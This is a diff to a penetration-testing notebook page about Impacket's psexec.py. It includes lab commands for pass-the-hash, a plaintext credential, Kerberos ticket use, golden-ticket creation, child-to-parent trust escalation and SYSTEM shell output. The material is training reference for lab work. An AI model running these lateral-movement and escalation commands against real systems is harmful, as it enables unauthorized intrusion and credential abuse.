@@ -9,6 +9,40 @@ hideFooterPagination: true
 
 {/* Generated from Commands/psexec.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## psexec.py: choose the operation and read the result
+
+SMB service shell; requires service-control rights and a writable share, usually local administrator.
+
+### What the result establishes
+
+The returned identity belongs to a service-created process on the remote host; verify it with whoami before using local paths or privileges.
+
+### Prerequisites and common failures
+
+A valid login is insufficient: service creation, writable administrative shares, SMB connectivity and endpoint policy all affect this method.
+
+Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.
+
+### Example 1: Password (prompted)
+
+Run in: **Kali**.
+
+```bash
+impacket-psexec 'DOMAIN/USER@TARGET_IP'
+```
+
+### Example 2: NT hash
+
+Run in: **Kali**.
+
+```bash
+impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
+```
+
+## Saved commands and notebook recipes
+
+SMB service shell; requires service-control rights and a writable share, usually local administrator.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=psexec) · [All tools](/index)
@@ -23,6 +57,13 @@ Replace UPPER_CASE values with your lab values.
 impacket-psexec 'DOMAIN/USER@TARGET_IP'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Example 1: Password (prompted)](/tools/impacket#example-1-password-prompted) · [psexec.py - SMB remote shell — Example 1: Password (prompted)](/tools/psexec#example-1-password-prompted)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 ## NT hash
 
 **Kali**
@@ -30,6 +71,13 @@ impacket-psexec 'DOMAIN/USER@TARGET_IP'
 ```bash
 impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Example 2: NT hash](/tools/impacket#example-2-nt-hash) · [psexec.py - SMB remote shell — Example 2: NT hash](/tools/psexec#example-2-nt-hash)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -55,6 +103,13 @@ wmiexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
     # Execute commands remotely through WMI
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Remote Access](/active-directory/command-reference#remote-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="4. Impacket Toolkit">
@@ -66,6 +121,13 @@ wmiexec.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
 ```bash
 psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Linux — 4. Impacket Toolkit](/active-directory/enumeration-linux#4-impacket-toolkit)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -96,6 +158,13 @@ nt authority\system
 C:\Windows\system32> hostname
 ACADEMY-EA-DC01
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Linux — Getting a SYSTEM shell using Impacket's psexec.py](/active-directory/trusts-child-parent-linux#getting-a-system-shell-using-impackets-psexec-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -146,6 +215,13 @@ C:\Windows\system32>exit
 [*] Removing file BnEGssCE.exe.....
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Linux — Performing the Attack with raiseChild.py](/active-directory/trusts-child-parent-linux#performing-the-attack-with-raisechild-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Child to Parent Trusts - Linux**
 
 ```python
@@ -176,6 +252,13 @@ C:\Windows\system32>exit
 #           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
 #              parameter.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Linux — Performing the Attack with raiseChild.py](/active-directory/trusts-child-parent-linux#performing-the-attack-with-raisechild-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -222,6 +305,13 @@ connection:
   -target-ip ip address
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Impacket PsExec](/modules/common-services/full-reference#impacket-psexec)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
@@ -245,6 +335,13 @@ nt authority\system
 WIN7BOX
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Impacket PsExec](/modules/common-services/full-reference#impacket-psexec)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Check installation on Kali">
@@ -259,6 +356,13 @@ impacket-psexec -h
 # If missing:
 sudo apt install impacket-scripts
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Check installation on Kali](/tools/impacket#check-installation-on-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -284,6 +388,13 @@ ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   #
 smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="impacket (psexec / wmiexec / smbexec / atexec)">
@@ -295,6 +406,13 @@ smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 ```bash
 impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Hash from Linux and Windows — impacket (psexec / wmiexec / smbexec / atexec)](/password-attacks/pass-the-hash#impacket-psexec-/-wmiexec-/-smbexec-/-atexec)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -332,6 +450,13 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 └── Either → reverse shell via exploit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Quick Decision">
@@ -347,6 +472,13 @@ Windows GUI    → RDP (3389)
 Windows cmd    → WMI (135)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Quick Decision](/reference/master-protocol-service-quick-reference#quick-decision-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="From SMB access to remote code execution">
@@ -361,6 +493,13 @@ impacket-smbexec <user>:'<pass>'@<IP>            # semi-interactive, no binary d
 impacket-wmiexec <user>:'<pass>'@<IP>            # over WMI, fileless (stealthiest)
 impacket-psexec -hashes :<NTLM_hash> <user>@<IP> # Pass-the-Hash variant
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SMB Enumeration and Shares — From SMB access to remote code execution](/enumeration/smb-enumeration-server-message-block#from-smb-access-to-remote-code-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -378,6 +517,13 @@ exploit/windows/smb/psexec
   └── Module type
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Module Naming Convention](/exploitation/shells-payloads-cheat-sheet#module-naming-convention)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Meterpreter getsystem and alternatives">
@@ -393,6 +539,13 @@ incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
 psexec -s -i cmd.exe 
 python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Meterpreter getsystem and alternatives](/privesc/windows-privesc-checklist#meterpreter-getsystem-and-alternatives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -411,6 +564,13 @@ impacket-psexec -h
 sudo apt install impacket-scripts
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [psexec.py - SMB remote shell — Find or install the command](/tools/psexec#find-or-install-the-command)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **psexec.py - SMB remote shell**
 
 Context from the notebook: impacket-psexec  is Kali's launcher for Impacket's  psexec.py . Microsoft's  PsExec.exe  is a separate Windows tool; its flags are different.
@@ -418,6 +578,13 @@ Context from the notebook: impacket-psexec  is Kali's launcher for Impacket's  p
 ```text
 PsExec.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [psexec.py - SMB remote shell — Find or install the command](/tools/psexec#find-or-install-the-command)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -439,6 +606,13 @@ export KRB5CCNAME=/path/to/user.ccache
 impacket-psexec -k -no-pass -target-ip 192.0.2.10 'example.local/user@server.example.local'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [psexec.py - SMB remote shell — Password, hash, or Kerberos](/tools/psexec#password-hash-or-kerberos)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="psexec.py - SMB remote shell">
@@ -455,6 +629,13 @@ impacket-psexec 'example.local/administrator@192.0.2.10'
 psexec.py 'example.local/administrator@192.0.2.10'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [psexec.py - SMB remote shell — Existing notes and worked examples](/tools/psexec#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Impacket: Script Quick Reference">
@@ -468,6 +649,13 @@ Context from the notebook: SMB remote shell psexec.py  /  impacket-psexec PsExec
 ```text
 psexec.py
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples) · [psexec.py - SMB remote shell — Find or install the command](/tools/psexec#find-or-install-the-command) · [Windows remote execution by service — Choose a tool](/tools/windows-remote-execution#choose-a-tool)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -483,6 +671,21 @@ Context from the notebook: PsExec 445 Remote exec via SMB psexec.py &lt;user>:&l
 psexec.py <user>:<pass>@<IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Windows Remote Access](/reference/master-protocol-service-quick-reference#windows-remote-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [psexec.py - SMB remote shell](/tools/psexec)
+
+{/* VAULT_RELATED_END */}
